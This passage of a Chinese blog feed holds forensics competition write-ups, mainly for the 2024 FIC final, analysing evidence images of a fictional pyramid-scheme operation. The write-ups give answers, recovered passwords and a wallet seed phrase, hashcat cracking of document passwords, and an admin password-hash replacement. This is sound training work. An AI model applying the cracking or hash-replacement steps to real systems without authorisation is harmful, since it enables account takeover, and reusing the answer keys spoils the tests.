根据IDFC的交易记录作分析，总共有多少次IDFC交易流入地址0x10a4f01b80203591ccee76081a4489ae1cd1281c？(1分)</strong><br>A. 0<br>B. 1<br>C. 2<br>D. 3<br>这个地址在to也就是F列出现过两次，所以是转入两次，C</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/98.png" alt="97"></p><p><strong>99. [单选题] 参考David_Laptop_64GB.e01，在David计算机的D盘内有一张图片，根据图片上的信息，找出David另一个虚拟货币钱包的恢复短语(2)(Recovery Seed)，下列哪一个单词是在此恢复短语(2)(Recovery Seed)内？(3分)</strong><br>A. fall<br>B. bread<br>C. brain<br>D. dove<br><strong>D</strong></p><p>在D盘只能找到这些</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/99-1.png" alt="99-1"></p><p>以可以看见的两个词为线索，用xways在内存镜像里同步搜索，最后能搜出来剩余的助记词</p><p>infant fragile garlic bracket stove blade stick dove aerobic spin term educate</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/99.png" alt="99"></p><p><strong>100. [多选题] 承上题,参考David_Laptop_64GB.e01，在IDFC的交易记录中，下列哪些地址由上述恢复短语(2)(Recovery Seed)所生成？(2分)</strong><br>A. 0xb2e3dbea311511ec5bda3e85e061f15366f888a6<br>B. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6<br>C. 0x90f73497E4446f6Cf9881213C32D6af66d799fE5<br>D. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042<br><strong>CD</strong></p><p>同97，用助记词计算地址得到结果</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/100.png" alt="100"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024第四届全国网络空间取证竞赛(FIC)决赛writeup</title>
      <link href="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/"/>
      <url>/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2024FIC决赛writeup"><a href="#2024FIC决赛writeup" class="headerlink" title="2024FIC决赛writeup"></a>2024FIC决赛writeup</h1><h2 id="案情设计"><a href="#案情设计" class="headerlink" title="案情设计"></a><strong>案情设计</strong></h2><p>2023年3月15日凌晨，受害人短视频平台上看到一段近期火爆的交通事故视频，留言后有人通过私信联系，称有一个赚大钱的机会，该人自称李某，提议让他到他们平台充值做代理；最终受害人发现自己被卷入了一个复杂的网络传销犯罪活动中，从而报案。</p><p>   经过一段时间的侦查，2023年3月25日，警方最终锁定了“lalala李”网络水军团伙的技术人员卢某，一举拿下了卢某的住所；当天上午，警方开始对卢某某的个人计算机进行现场勘验。在管理工具历史记录中,发现了大量访问某个PVE云服务器控制台的记录。初步判断该云服务器可能为该团伙网络引流的主要平台。</p><p>   经过进一步追查，警方发现该PVE云服务器租用于某知名云服务商，服务器上运行着数个不同的虚拟机实例；平台通过虚拟软件模拟多部手机，利用网络水军的力量在各大平台发布伪造的图片传播负面新闻，引流受害者加入平台。</p><p>   在深入分析虚拟机镜像后，警方终于发现这些虚拟机背后运行着一个复杂的网络传销平台！最终，警方展开了一场声势浩大的收网行动，成功捣毁了该犯罪团伙。案件中的主要成员李安弘、卢某某等人均被依法逮捕。</p><p>   接下来，我们将深入分析关键证据镜像文件，揭开这个庞大网络传销窝点的犯罪事实。</p><p>检材情况：</p><p>1、卢某个人计算机—PersonalPC.E01， MD5:6ee6056aaf226c019426c468c0d3bc7b</p><p>2、PVE服务器调证镜像1—sys.E01， MD5:a801b084c6e71ed59fbcfcdc9694bed4</p><p>3、PVE服务器调证镜像2—data.E01， MD5:2eaef3b6304e4fd1eeefb84d69609126</p><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a><strong>题目解析</strong></h2><h3 id="计算机介质部分（15题）"><a href="#计算机介质部分（15题）" class="headerlink" title="计算机介质部分（15题）"></a><strong>计算机介质部分（15题）</strong></h3><p><strong>1、请分析卢某的计算机，并计算原始检材的SHA256值。</strong></p><p>484117F3002E5B876C81DD786F899A439514BB0621D62D58F731E5B344DB3634</p><p>(火眼首页计算的是磁盘的哈希，独立哈希工具直接计算了整个镜像文件，原始检材，所以是前者)</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-1.png" alt="pc-1"></p><p><strong>2、嫌疑人回收站中的“备忘录.txt”文件SHA1 值为？</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-2.png" alt="pc-2"><strong>3、嫌疑人使用ssh连接工具，该工具的名称为？【答案格式：fic123】</strong></p><p>MobaXterm</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-3.png" alt="pc-3"></p><p><strong>4、嫌疑人使用ssh连接工具，其中连接名为node的连接记录，连接的端口为？【答案格式：123】</strong></p><p>如图3，122</p><p><strong>5、在2024-03-12 17:13左右，嫌疑人计算机最少连接了__台安卓虚拟机。【答案格式：1】</strong></p><p>这个没想到，居然在图片文件夹里；C:\Users\Luck\Pictures\Saved Pictures</p><p>一共5台</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-5.png" alt="pc-5"></p><p><strong>6、软件“QtScrcpy”的配置文件显示，嫌疑人配置了__台安卓虚拟机（以连接端口计数）。【答案格式：123】</strong></p><p>用户文档文件放了QtScrcpy的所有文件，找到config，config下的userdata.ini有；</p><p>一共15条，把%3A URL解码就看明白了</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-6.png" alt="pc-6"></p><p><strong>7、嫌疑人桌面文件“老婆.png”的SHA256哈希值为？【答案格式：abc123】</strong></p><p>02139bf305630ceffadd6926c202bae655c79d25a64f5c7a1c62bc4c91c9ccf1</p><p><strong>8、嫌疑人把xls文件藏入老婆.png中，该xls的密码为？【答案格式：Abc123】</strong></p><p>备忘录有密码规则，规则是八位大小写数字加字母；用hashcat和office2john跑出来是P1ssw0rd</p><p>以为要很久，谁知道半个小时左右成功了</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-8-1.png" alt="pc-7-1"></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-8-2.png" alt="pc-7-2"></p><p><strong>9、嫌疑人桌面”2024年3月13日星期三 日报.docx”文档密码为？【答案格式：Abc123】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-9.png" alt="pc-9"></p><p>密码规则见第8题，根据规则设置掩码再次用hashcat爆破，因为只改了数字这次很快就出来了</p><p><strong>10、嫌疑人使用的AI软件名称为？【答案格式：abc-df-abc】</strong></p><p>从第9题的word文档附带的图片可以看出来嫌疑人使用了stable-diffussion</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-10-1.png" alt="pc-10-1"></p><p>AppData文件夹搜索找到</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-10.png" alt="pc-10"></p><p><strong>11、嫌疑人使用的AI软件监听端口为？【答案格式：1】</strong></p><p>端口除了在配置文件和日志和netstat还可以在浏览器里找；</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-11.png" alt="pc-11"></p><p><strong>12、AI软件安装目录下的“2024-03-13”目录，其中由AI生成的图片有多少张?【答案格式：1】</strong></p><p>这个2024-03-13文件夹一共是两个，在安装目录的output文件夹下，加起来45张；</p><p><strong>13、嫌疑人使用AI软件生成燃烧的汽车图片使用的模型SHA256哈希值为？</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-13.png" alt="pc-12"></p><p>word里面的图片有生成燃烧汽车的使用截图，模型在左上角；在安装目录里面的models\Stable-diffusion可以发现模型文件，计算SHA256为：</p><p>22e8515aa5985b776afc1e48647f23f5651a317d2497a91232d03a1c4feeae2c</p><p><strong>14、嫌疑人使用AI软件生成燃烧的 汽车图片（00036-957419862.png)使用的，正向提示词，包含哪些？</strong></p><p>00036-957419862.png这张图片对应上一题图片中ai生成图的左下角那张，所以提示词就是上题截图中的提示词，提示词有两个框，上面是正向提示词，下面是反向，故答案为：high way,china,A tanker truck catches fire,car on fire</p><p><strong>15、嫌疑人桌面文件”老婆.png”的图像生成种子是__。【答案格式:123】</strong></p><p>有些ai生成图片时会把参数嵌入图片数据中，可以用exiftool看到</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pc-15.png" alt="pc-15"></p><h3 id="PVE虚拟化平台部分（10题）"><a href="#PVE虚拟化平台部分（10题）" class="headerlink" title="PVE虚拟化平台部分（10题）"></a><strong>PVE虚拟化平台部分（10题）</strong></h3><p>配置说明：仿真要注意勾选嵌套虚拟化；</p><p>仿真后首先修改&#x2F;etc&#x2F;network&#x2F;interfaces使其处于本机的虚拟网络VMnet8（NAT模式）之下（创建虚拟机记得NAT）</p><p>然后再改&#x2F;etc&#x2F;issue和&#x2F;etc&#x2F;hosts,改pve的web管理地址</p><p>PVE（Promox Virtual Envrionment）是虚拟机管理系统，用Linux内核，借助pve，可以轻松管理虚拟机和容器，有图形化的管理界面。</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-conf1.png" alt="pve-conf1"></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-conf2.png" alt="pve-conf2"></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-conf3.png" alt="pve-conf3"></p><p><strong>1、PVE虚拟化平台版本号为？【答案格式：1.1.1】</strong></p><p>pveversion出8.1.4</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-1.png" alt="pve-1"></p><p><strong>2、PVE虚拟化平台的web管理地址为？【答案格式：192.168.1.1:22】</strong></p><p>原先是&#x2F;etc&#x2F;issue是192.168.71.133，这里我要登录web管理地址所以改掉了</p><p><strong>3、在PVE虚拟化平台中，当前共有多少个虚拟机？【答案格式：1】</strong></p><p>7</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-3.png" alt="pve-3"></p><p><strong>4、PVE虚拟化平台的“vmbr1”网卡所使用的网段为？【答案格式：192.168.1.0&#x2F;11】</strong></p><p>ip a→192.168.100.0&#x2F;24</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-4.png" alt="pve-4"></p><p><strong>5、PVE虚拟化平台中“120(Luck)”虚拟机的smbios uuid为？【答案格式：123abc-123ba-123ad-23ab-12345abczc】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-5.png" alt="pve-5"></p><p><strong>6、在PVE虚拟化平台中，用户“Lu2k”被授予了多少个虚拟机的使用权限？【答案格式：1】</strong></p><p>4台</p><p>看看每个虚拟机下面的权限那一栏，统计一下就行</p><p><strong>7、在PVE虚拟化平台中，shell历史命令中最后一条命令为？【答案格式：hello world】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-6.png" alt="image-20241107085911265"></p><p>忽略自己的，lxc-attach 110</p><p><strong>8、请分析嫌疑人最近一次销毁虚拟机的时间为</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-8.png" alt="pve-8"></p><p>2023-03-22 18:15:18,直接从节点的任务历史来看比较好，因为有的虚拟机被删除了，从剩下的虚拟机看会有遗漏</p><p><strong>9、PVE虚拟化平台的openEuler系统镜像下载的开始时间为？</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-9.png" alt="image-20241107092936160"></p><p><strong>10、根据嫌犯供述，可通过快照启动PVE虚拟化平台中的云手机。请根据该条线索找到对应虚拟机，其快照的时间为</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/pve-10.png" alt="image-20241107093112167"></p><h3 id="软路由部分（10题）"><a href="#软路由部分（10题）" class="headerlink" title="软路由部分（10题）"></a><strong>软路由部分（10题）</strong></h3><p><strong>1、软路由root用户的密码是？【答题格式：abc123】</strong></p><p>这个是在计算机部分的检材中有,OP2024fic</p><p><strong>2、软路由管理面板所用http协议监听的端口为？【答案格式：7001】</strong></p><p>cat &#x2F;etc&#x2F;config&#x2F;uhttpd</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-2.png" alt="rts-2"></p><p>8080</p><p><strong>3、软路由的系统版本号为？【答案格式：1.1.1】</strong></p><p>cat &#x2F;etc&#x2F;os-release</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-3.png" alt="rts-3"></p><p><strong>4、软路由的WAN口所配置的网关为？【答案格式：1.1.1.1】</strong></p><p>less &#x2F;etc&#x2F;config&#x2F;network</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-4.png" alt="rts-4"></p><p><strong>5、软路由防火墙端口转发规则有多少条记录【答案格式：1】</strong></p><p>翻找防火墙的配置文件&#x2F;etc&#x2F;config&#x2F;firewall，找到config redirect开头,src为wan，dst为lan的记录,一共17条；</p><p><strong>6、OpenClash控制面板登录密钥为？【答案格式：Abc123】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-6.png" alt="rts-6"></p><p>openclash的控制面板登陆密码储存在&#x2F;etc&#x2F;openclash&#x2F;config.yaml的secret字段</p><p>这里改了一下网络配置，因为没有ssh工具用，也登陆不了LUCIweb（路由管理界面）还是比较难受的，用less来翻太慢了</p><p><strong>7、OpenClash的局域网代理密码（SOCKS5&#x2F;HTTP认证信息)为？【答题格式：Abc123】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-7.png" alt="rts-7"></p><p><strong>8、OpenClash的订阅地址为？【答案格式：<a href="https://www.forensix.cn】/">https://www.forensix.cn】</a></strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-8.png" alt="rts-8"></p><p><strong>9.代理节点”香港501 中继 动态”的服务端口为？【答案格式:123】</strong></p><p>还是config.yaml</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-9.png" alt="rts-9"></p><p>42001</p><p><strong>10、OpenWrt的包管理软件的系统镜像源配置文件的绝对路径是？【答案格式：&#x2F;root&#x2F;hl&#x2F;abc.conf】</strong></p><p>openwrt的包管理软件，opkg，类似于yum，这题问的是opkg安装包的时候，指定什么镜像源的配置文件</p><p>一般在&#x2F;etc&#x2F;opkg&#x2F;distfeeds.conf</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/rts-10.png" alt="rts-10"></p><h3 id="云手机部分（10题）"><a href="#云手机部分（10题）" class="headerlink" title="云手机部分（10题）"></a><strong>云手机部分（10题）</strong></h3><p>PVE平台连接虚拟机有两点要注意：</p><p>1.要开启虚拟引擎；</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj1.png" alt="ysj1"></p><p>2.要修改对虚拟cpu数量的限制；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/share/perl5/PVE/QemuServer.pm注释掉die &quot;MAX $allowed_vcpus vcpus allowed per VM on this node\n&quot; if ($allowed_vcpus &lt; $maxcpus);</span><br></pre></td></tr></table></figure><p>（这里介绍一个vi小技巧，如果文件很长可以再普通模式下输入&#x2F;，后面输入要找的字符串，回车，直接定位到要改的地方）</p><p>然后重启pvedaemon服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart pvedaemon</span><br></pre></td></tr></table></figure><p><strong>1、PVE虚拟化平台的虚拟机“101(node1)”的droid用户登录密码为？【答案格式：Abc123】</strong></p><p>这个也在pc检材里，是droid2024fic</p><p><strong>2、PVE虚拟化平台的虚拟机“101(node1)”中Docker容器的镜像ID的前六位为？【答案格式：abc123】</strong></p><p>docker images</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-2.png" alt="ysj-2"></p><p>d1d4bf</p><p><strong>3、在PVE虚拟化平台的node1虚拟机中，容器手机的数量为？【答案格式：1】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-3.png" alt="image-20241110205203613"></p><p>5</p><p><strong>4、在PVE虚拟化平台的node1虚拟机中，若要启动手机容器，有几条前置命令（docker命令不纳入计算）? 【答案格式：1】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-4.png" alt="ysj-4"><strong>5、在PVE虚拟化平台的“101(node1)”虚拟机中启动“priceless_knuth”手机容器后，该安卓手机的蓝牙MAC地址是多少？【答案格式:12:34:ab:cd:a1:b2】</strong></p><p>android手机的蓝牙储存在&#x2F;data&#x2F;misc&#x2F;bluedroid&#x2F;bt_config.conf</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-5.png" alt="ysj-5"></p><p>3c:5a:b4:01:02:03</p><p><strong>6、警方现场勘验过程中，曾使用雷电手机取证软件通过嫌疑人软路由对云手机进行了远程取证，请问以下哪个端口可以明确是取证时使用过的端口？【多选题】</strong></p><p>A.11111</p><p>B.12222</p><p>C.13333</p><p>D.23333</p><p>E.24444</p><p>F.35555</p><p>这个在node2里，node2添加为新检材后分析可以发现com.hl.helper，说明警方通过node2对手机取证，而node2的手机对应的软路由端口以2开头，选de</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-6.png" alt="ysj-6"></p><p><strong>7、在PVE虚拟化平台的node2中名为loving_shtern的手机映射至软路由中，所占用的端口号为？【答案格式：123】</strong></p><p>loving_shtern的端口为5555，对应到软路由的端口为25555</p><p>别忘了是node2</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-7.png" alt="ysj-7"></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-7-1.png" alt="ysj-7-1"></p><p><strong>8、在PVE虚拟化平台的node2中loving_shtern手机容器中安装的名为“抖音”安装包的MD5值为？【答案格式：abc123】</strong></p><p>这里我直接链接了容器，从容器里把apk薅到finalshell，再下载，拖到雷电里；0ce8f95ba0401769a9f4860749cc8206（其实后来才发现太麻烦了，可以直接docker inspect看容器映射到主机的目录，在那里面找就OK）</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-8.png" alt="ysj-8"></p><p><strong>9、根据集群中手机内容分析，传销人员在评论区引流使用的qq号为？【答案格式：123】</strong></p><p>没找到“评论区”，翻了node1和node2的docker映射目录只发现了node1有tim；本来想翻数据库的，奈何不知道数据库是什么编码，出来的全是乱码；看来还是用火眼再跑一下node1吧</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-9.png" alt="ysj-9"></p><p>发现qq号；解释一下，tim是qq办公简版</p><p><strong>10、通过云手机聊天记录可以得知，涉案传销网站域名为？【答案格式：<a href="http://www.forensix.cn】/">www.forensix.cn】</a></strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/ysj-10.png" alt="image-20241111150412283"></p><h3 id="传销网站部分（15题）"><a href="#传销网站部分（15题）" class="headerlink" title="传销网站部分（15题）"></a><strong>传销网站部分（15题）</strong></h3><p><strong>1、涉案服务器集群中，sql数据库服务器112（sqlserver）对应的虚拟磁盘的SHA256值为？</strong></p><p>记住这里不要启动112，直接导出来算（其实本来可以作为嵌套证据添加到新检材的，不知道为什么readerror）</p><p>然后这里有个发现，关于火眼的；如果在导入检材那里计算哈希，计算的是磁盘的哈希；如果用工具箱的哈希计算工具，那就是整个qcow2文件</p><p><strong>2、涉案服务器集群中，数据库服务器的root用户密码加密方式为？</strong></p><p>这里直接把导出来的qcow2导入火眼，然后看&#x2F;etc&#x2F;shadow</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-2.png" alt="image-20241111160423692"></p><p>是sm3,特地查了一下，是中国国家密码算法标准之一，某些情况下替代sha256</p><p><strong>3、涉案服务器集群中，数据库服务器的内核版本？【答案格式：1.1.1】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-3.png" alt="wz-3"></p><p>5.10.0</p><p><strong>4、涉案服务器集群中，Java服务器web服务监听的端口为？【多选题】</strong></p><p>问web应用的端口，那得找到网站，在历史命令发现他跑过一个jar包jinyi.web.web.jar </p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-4.png" alt="wz-4"></p><p>打开一看有BOOT-INF，是springboot框架，那直接看classes的配置文件</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-4-2.png" alt="wz-4-2"></p><p>9031，9032（下面那个忘记圈了）</p><p><strong>5、涉案服务器集群中，数据库服务器中Docker容器的数量为？【答案格式：1】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-5.png" alt="wz-5"></p><p><strong>6、 涉案服务器集群中，数据库服务器有一个mysql容器节点，该容器的ID前六位为?【答案格式：abc123】</strong></p><p>同上题3ba5cb</p><p><strong>7、涉案服务器集群中，数据库服务器mysql容器节点的数据库版本号为?【答案格式：1.1.1】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-7.png" alt="wz-6"></p><p><strong>8、从外部访问涉案网站“鲸易元MALL管理系统”管理后台所使用的域名为？【多选】</strong></p><p>A.jy.proxy2.jshcloud.cn</p><p>B.master.jy.proxy2.jshcloud.cn</p><p>C.jy.proxy.jshcloud.cn</p><p>D.master.jy.proxy.jshcloud.cn</p><p>这个在LXC容器里，用前面部分提到过的lxc-attach 110连接</p><p>首先这是nginx服务器，所以查看nginx配置文件&#x2F;etc&#x2F;nginx&#x2F;nginx；那么网站的信息可以看虚拟主机设置</p><p>（虚拟主机指的是在一台服务器通过不同的域名运行独立的网站）</p><p>我们发现了网站的配置文件在&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;proxy.conf</p><p>里面有后台相关的内容</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-8.png" alt="wz-8"></p><p>BD</p><p><strong>9、“鲸易元MALL管理系统”管理后台所使用的网站框架为？</strong></p><p>A.TOMCAT</p><p>B.SPRING_BOOT</p><p>C.Struts</p><p>D.THINKPHP</p><p>这题前文提到过，是B；</p><p><strong>10、“鲸易元MALL管理系统”管理后台运行时，依赖了几种不同的数据库？【答案格式：123】</strong></p><p>2种，这个在java服务器的分析结果了；redis和mysql见T7</p><p><strong>11、“鲸易元MALL管理系统”管理后台运行时，在生产环境（prod）下所连接的mysql服务器密码为？【答案格式：123】</strong></p><p>这题上面也提到了，一开始还不明白，为什么这么多yml；prod对应的是生产版本的，还有个test是测试的，dev猜不出来hhh</p><p>总之就是找到java应用的生产版本的配置文件,里面有连接密码honglian7001，见T7</p><p><strong>12、“鲸易元MALL管理系统”管理后台中Aliyun OSS对应的密钥KEY是为？【答案格式：Abc123】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-12.png" alt="wz-12"></p><p><strong>13、“鲸易元MALL管理系统”管理后台中，管理员（admin）的账号密码采用了什么样的加密方式？【答案格式：rc4】(不区分大小写)</strong></p><p>这里需要配置一下数据库；首先把112导出，仿真，发现他使用的是nmcli而不是network.service；同时nmcli connection show只有一个和docker的连接，没有网络连接，所以我们需要给网卡ens33创建一个连接然后启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmcli connection add type ethernet ifname ens33 con-name &quot;Wired Connection&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmcli connection up &quot;Wire connection&quot;</span><br></pre></td></tr></table></figure><p>然后可以用navicat连接到数据库看jinyi→sys_user→admin，发现其密码哈希以$2a开头，所以是bcrypt</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-13.png" alt="wz-13"></p><p><strong>14、“鲸易元MALL管理系统”管理后台中，管理员（admin）账号绑定的手机号码为？【答案格式：18818881888】</strong></p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-14.png" alt="wz-14"></p><p><strong>15、“鲸易元MALL管理系统”管理后台中，会员的数量为？【答案格式：123】</strong></p><p>52*1000+908&#x3D;52908</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/wz-15.png" alt="image-20241123112620850"></p><h3 id="数据分析部分（10题）"><a href="#数据分析部分（10题）" class="headerlink" title="数据分析部分（10题）"></a>数据分析部分（10题）</h3><p>前言1：</p><p>这里不得不搭建完整的网站了，网站的数据结构很复杂，如果不还原网站单看数据库会很难受；但是要复原完整的网站架构也不容易，毕竟和以前不一样，不是单服务器的网站，总的来说，配网的策略确实是很重要的；</p><p>感觉这次复现对我而言最难就在这里了，因为一开始我是直接只导出了数据库服务器，把它放在71和pve一个网段，这样可以看数据库，但是对整个网站的复原是不利的，这样的话，和jar包里面的配置就对不上了，复原网站将无法进行下去，看来最好还是修改自己的网络配置而不是去改虚拟机的</p><p>具体步骤：</p><p>首先把javaserver和sqlserver的镜像全部导出，然后设置一个新的虚拟网络VMnet9,仅主机模式，ip段为这些虚拟机原来的ip 192.168.100.255</p><p>注意给sqlserver和javaserver都要配置网卡；</p><p>javaserver是netplan作为网络管理工具，配置文件在&#x2F;etc&#x2F;netplan&#x2F;00-installer-config.yaml</p><p>将其网卡名称改为ip a的altname字段内容，然后netplan apply</p><p>sqlserver用的是NetworkManager,配置文件在&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-enp6s18</p><p>它本身有完整的配置文件，但是name和device与ip a的网卡对不上，改一下重启就行；</p><p>然后给pve加一个VMnet9的网卡，将其作为所有pve虚拟机虚拟网络的端口，这样pve和虚拟网络就连上了，lxc就可以和虚拟网络连接了（可以进入lxc然后ping另外两个机器看通不通），另外，原来的192.168.71虚拟网络走的是ens160网卡，互不冲突</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/netapply-1.png" alt="netapply-1"></p><p>启动网站首先保证lxc、java、sql三台机器都启动了；</p><p>mysql服务器把mysql和redis的docker都开上；然后navicat修改管理员的密码哈希，给他换为123456的Bcrypt算法哈希，直接改上就是</p><p>java服务器并行执行两个跑jar包的命令，符号别用错了，是&amp;</p><p>lxc container需要将服务器的域名全部加到hosts文件里，这样通过域名直接访问网站；（这个参考后台地址那题，那个文件里有所有的域名，全部对应到192.168.100.110）</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/netapply-2.png" alt="netapply-2"></p><p>前言2：</p><p>网矩我确实是第一次用，操作比较傻瓜式，但是在组织架构分析这确实有一手，比自己写脚本还是方便很多</p><p><strong>16、“鲸易元MALL管理系统”管理后台中，会员级别为“总代”的数量为?【答案格式:123】</strong></p><p>248</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-1.png" alt="sjfx-1"></p><p><strong>17、“鲸易元MALL管理系统”管理后台中,以“推荐人id”做为上级id对会员进行层级分析，总层级为多少层？（最高层级视为1层）【答案格式：123】</strong></p><p>这里直接网矩一把梭</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-2.png" alt="sjfx-2"></p><p><strong>18、“鲸易元MALL管理系统”管理后台中，会员编号为sgl01的下游人数（伞下会员）数量为？【答案格式：123】</strong></p><p>18001</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-3.png" alt="sjfx-3"></p><p><strong>19、“鲸易元MALL管理系统”管理后台中，会员编号为sgl01的下游人数（伞下会员）充值总金额合计为多少元&#x2F;RMB【答案格式：123】</strong></p><p>870411900</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-4.png" alt="sjfx-4"><strong>20、“鲸易元MALL管理系统”管理后台中，已支付订单的数量为？【答案格式：123】</strong></p><p>31760</p><p><img src="/2024/11/25/2024FIC%E5%86%B3%E8%B5%9B/sjfx-5.png" 